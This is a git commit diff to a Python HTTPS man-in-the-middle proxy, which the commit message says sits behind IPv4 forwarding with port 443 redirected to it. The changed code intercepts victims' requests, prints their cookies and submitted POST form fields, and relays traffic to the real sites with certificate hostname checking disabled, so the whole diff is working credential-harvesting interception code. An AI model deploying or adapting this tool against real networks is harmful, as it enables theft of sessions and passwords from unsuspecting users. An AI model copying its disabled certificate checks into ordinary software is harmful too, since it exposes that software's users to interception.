f24ecd3f1faba30404045b47a15d2e4580d319a9
Sári László <slaszlo.bme@gmail.com>
2017-03-13 21:29:14 +0100

    added setting up ipv4 forwarding and redirect port 443 to mitm_proxy

--- ssl_server.py
+++ ssl_server.py
@@ -5,6 +5,8 @@ import socketserver
 from cgi import parse_header, parse_multipart
 from urllib.parse import parse_qs
 import http.client, urllib.parse
+import gzip
+from urllib.parse import urlparse
 
 
 stop = 1
@@ -14,27 +16,37 @@ class MyHandler(BaseHTTPRequestHandler):
 
     def do_GET(self):
         print('[*] GET', self.headers['Host'] + "/" + self.path)
+        hs = {}
+        for h in self.headers:
+            hs[h] = self.headers[h]
+        print("\t\tcookie: ", self.headers['Cookie'])
+        print("\n")
+        ok = 0
 
-        try:
-            hs = {}
-            for h in self.headers:
-                if str(h) != 'Accept-Encoding':
-                    hs[h] = self.headers[h]
-            print("\t\tcookie: ", self.headers['Cookie'])
-            print("\n")
-            conn = http.client.HTTPSConnection(self.headers['Host'])
-            conn.request("GET", self.path, headers=hs) # TODO check if headers are working
-            r1 = conn.getresponse()
-            #print(r1.status, r1.reason)
-            data1 = r1.read()
+        for i in range(10):
+            try:
+                ctx = ssl._create_default_https_context()
+                ctx.check_hostname = False
+                conn = http.client.HTTPSConnection(self.headers['Host'], context=ctx, check_hostname=False)
+                conn.request("GET", self.path, headers=hs)  # TODO check if headers are working
+                r1 = conn.getresponse()
 
-            self.wfile.write(b'HTTP/1.1 200 OK')
-            for h in r1.headers:
-                self.send_header(h, r1.headers[h])
-            self.end_headers()
-            self.wfile.write(data1)
-        except Exception as e:
-            print(e)
+                data1 = r1.read()
+
+                self.send_response(r1.status)
+                for h in r1.headers:
+                    self.send_header(h, r1.headers[h])
+                self.end_headers()
+
+                self.wfile.write(data1)
+                return
+            except Exception as e:
+                print(str(e))
+            finally:
+                pass
+                #self.connection.close()
+
+
 
     def parse_POST(self):
         ctype, pdict = parse_header(self.headers['content-type'])
@@ -42,46 +54,58 @@ class MyHandler(BaseHTTPRequestHandler):
             postvars = parse_multipart(self.rfile, pdict)
         elif ctype == 'application/x-www-form-urlencoded':
             length = int(self.headers['content-length'])
-            postvars = parse_qs(
-                self.rfile.read(length),
-                keep_blank_values=1)
+            try:
+                self.params = self.rfile.read(length)
+                d = self.params.decode('ascii')
+                postvars = parse_qs(d)
+            except Exception as e:
+                print(str(e))
+                postvars = {}
         else:
             postvars = {}
         return postvars
 
     def do_POST(self):
-        print("[*] POST " + self.headers['Host'] + " " + self.path)
-        tmp = self.parse_POST()
-        postvars = {}
+        try:
+            print("[*] POST " + self.headers['Host'] + " " + self.path)
+            tmp = self.parse_POST()
+            postvars = {}
 
-        print("\t\tcookie: ", self.headers['Cookie'])
-        for v in tmp:
-            postvars[v.decode('ascii')] = tmp[v][0].decode('ascii')
-        params = urllib.parse.urlencode(postvars)
+            print("\t\tcookie: ", self.headers['Cookie'])
+            for v in tmp:
+                postvars[v] = tmp[v][0]
 
-        print("\t\tPOST variables:")
-        for v in postvars:
-            print("\t\t\t", v, ": ", postvars[v])
-        print("\n")
-        hs = {}
-        for h in self.headers:
-            hs[h] = self.headers[h]
-        conn = http.client.HTTPSConnection(self.headers['Host'])
-        conn.request("POST", self.path, params, hs)  # TODO check if headers are working
-        r1 = conn.getresponse()
-        #print(r1.status, r1.reason)
-        data1 = r1.read()  # This will return entire content.
-        self.wfile.write(b'HTTP/1.1 200 OK')
-        for h in r1.headers:
-            self.send_header(h, r1.headers[h])
-        self.end_headers()
-        self.wfile.write(data1)
+            print("\t\tPOST variables:")
+            for v in postvars:
+                print("\t\t\t", v, ": ", postvars[v])
+            print("\n")
+            hs = {}
+            for h in self.headers:
+                hs[h] = self.headers[h]
+            conn = http.client.HTTPSConnection(self.headers['Host'])
+            conn.request("POST", self.path, self.params, self.headers)  # TODO check if headers are working
+            r1 = conn.getresponse()
+
+            data1 = r1.read()  # This will return entire content.
+
+            self.send_response(r1.status)
+            for h in r1.headers:
+                self.send_header(h, r1.headers[h])
+            self.end_headers()
+            self.wfile.write(data1)
+        except Exception as e:
+            print(str(e))
+        finally:
+            pass
+            #self.connection.unwrap()
+
+    def log_message(self, format, *args):
+        return
 
 
 class ForkingHTTPServer(socketserver.ThreadingMixIn, HTTPServer):
     def finish_request(self, request, client_address):
         request.settimeout(30)
-        # "super" can not be used because BaseServer is not created from object
         HTTPServer.finish_request(self, request, client_address)
 
 
